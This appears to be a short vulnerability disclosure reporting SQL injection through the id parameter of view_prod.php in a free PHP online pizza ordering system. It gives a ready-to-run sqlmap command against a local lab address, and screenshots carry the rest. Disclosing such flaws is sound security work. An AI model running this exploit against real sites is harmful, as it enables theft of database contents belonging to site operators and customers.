vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220946328-9a6ba721-2b00-4908-9075-9c271ccb854e.png)


exp

```
sqlmap.py -u "http://192.168.31.50/php-opos/view_prod.php?id=1"
```
![image](https://user-images.githubusercontent.com/30823782/220946382-e10e03fd-3188-44c0-8dc0-3137a1f35876.png)

